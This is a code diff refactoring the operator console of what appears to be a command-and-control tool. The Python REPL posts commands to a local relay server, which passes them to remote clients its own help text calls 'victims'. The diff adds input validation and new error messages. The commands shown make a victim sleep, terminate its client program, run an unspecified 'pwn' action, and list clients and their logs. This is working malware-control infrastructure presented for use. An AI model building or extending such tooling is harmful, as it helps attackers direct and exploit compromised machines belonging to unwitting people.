@@ -4,85 +4,89 @@ import requests
 import re
 
 PLAIN_HEADER = {'Content-Type': 'text/plain'}
-SLP_SYN_ERR   = 'Invalid slp syntax, needs two args <client_id> & <n>'
-SLP_SYN_ERR_2 = 'Invalid slp syntax, <n> must be a +ve int.'
-SHD_SYN_ERR   = 'Invalid shd syntax, requires one arg <client_id>'
-PWN_SYN_ERR   = 'Invalid pwn syntax, requires one arg <client_id>'
+CMD_SYN_ERR  = 'Invalid command, please use \'help\' to refer to commands.'
+LOGS_SYN_ERR = 'Invalid logs syntax, needs one arg <client_id>'
+SLP_SYN_ERR  = 'Invalid slp syntax, needs two args <client_id> & <n>'
+SHD_SYN_ERR  = 'Invalid shd syntax, requires one arg <client_id>'
+PWN_SYN_ERR  = 'Invalid pwn syntax, requires one arg <client_id>'
 
 global exit
 
-# effectively run a simple repl, break once the user enters 'exit'
 def run():
+    ''' effectively run a simple repl, break once the user enters 'exit'
+    otheriwse handle the command provided by the user
+    '''
     print_home()
-
     global exit
+
     exit = False
     while True:
-        cmd = input('> ').strip()
-        if len(cmd) == 0: 
-            continue
-        
+        cmd = input('> ').strip()        
         handle_command(cmd)
+
         if exit: 
             break
 
 def text_from_response(response) -> str:
     return f'RET CODE |{response.status_code}|\n\n{response.content.decode()}\n'
 
-def handle_command(cmd):
+def handle_command(full_cmd):
     ''' Extract all the arguments of the command, if the cmd length is 1 then its 
 
     '''
-    arr = re.sub(pattern='\s+', repl=' ', string=cmd.strip())\
-        .split(' ')
+    arr = re.sub(pattern='\s+', repl=' ', string=full_cmd.strip()).split(' ')
     if len(arr) < 1 or len(arr) > 3:
-        print(f'Invalid command: \'{cmd_id}\'\nPlease refer to the commands again.')
+        print(CMD_SYN_ERR)
         return
 
-    # try match standalone commands such as 'help' or 'clients'
-    cmd_id = arr[0]
-    if len(arr) == 1:
-        handle_helper_cmds(cmd_id)
+    is_valid, err_msg = validate_command(arr[0], len(arr))
+    if not is_valid:
+        print(err_msg)
         return
     
-    client_id   = arr[1]
-    slp_seconds = arr[2] if len(arr) == 3 else None
+    # handle commands with one token
+    if len(arr) == 1:
+        handle_helper_cmds(arr[0])
+        return
 
-    # check the command preconditions so we don't have to at the server or client
-    match cmd_id.lower():
+    cmd = arr[0]
+    client_id = arr[1]
+    match cmd.lower():
         case 'logs':
             response = requests.get(f'http://127.0.0.1:5000/logs/{client_id}')
             print(text_from_response(response))
             return
-        case 'slp':
-            if len(arr) != 3:             print(SLP_SYN_ERR);  return
-            if not slp_seconds.isdigit(): print(SLP_SYN_ERR_2);return
-            cmd = f'{cmd_id} {slp_seconds}'
-        case 'shd': 
-            if len(arr) != 2: print(SHD_SYN_ERR); return
-            cmd = cmd_id
-        case 'pwn': 
-            if len(arr) != 2: print(PWN_SYN_ERR); return
-            cmd = cmd_id
-        case _: 
-            print(f'Invalid command: \'{cmd_id}\'\nPlease refer to the commands again.')
-            return
+        case 'slp': cmd = f'{cmd} {arr[2]}'
+        case 'shd': pass
+        case 'pwn': pass
 
     response = requests.post(f'http://127.0.0.1:5000/commands/{client_id}', data=cmd, headers=PLAIN_HEADER)
     print(text_from_response(response))
 
-def handle_helper_cmds(cmd_id):
+
+def handle_helper_cmds(cmd):
     ' Handle the helper controller-side commands. Returns true if the command was exit! '
     global exit
-    match cmd_id.lower():
-        case 'help': print_home()
+    match cmd:
         case 'exit': exit = True
+        case 'help': print_home()
         case 'clear': os.system('cls')
         case 'clients':
             response = requests.get(f'http://127.0.0.1:5000/clients')
             print(text_from_response(response))
-        case _: 
-            print(f'Invalid command: \'{cmd_id}\'\nPlease refer to the commands again.')
+
+
+def validate_command(cmd: str, num_args: int) -> tuple[bool, str]:
+    match cmd:
+        case 'help':    return (num_args == 1, CMD_SYN_ERR)
+        case 'exit':    return (num_args == 1, CMD_SYN_ERR)
+        case 'clear':   return (num_args == 1, CMD_SYN_ERR)
+        case 'clients': return (num_args == 1, CMD_SYN_ERR)
+        case 'logs':    return (num_args == 2, LOGS_SYN_ERR)
+        case 'slp':     return (num_args == 3, SLP_SYN_ERR)
+        case 'shd':     return (num_args == 2, SHD_SYN_ERR)
+        case 'pwn':     return (num_args == 2, PWN_SYN_ERR)
+        case _:         return (False, CMD_SYN_ERR)
 
 
 def print_home():
@@ -101,6 +105,7 @@ def print_home():
     List of remote commands:
       1) slp <client_id> <num_of_seconds>
           - Make the victim sleep for n seconds.
+          - n must be >= 0
       2) shd <client_id>
           - Terminate execution of client program.
       3) pwn <client_id>
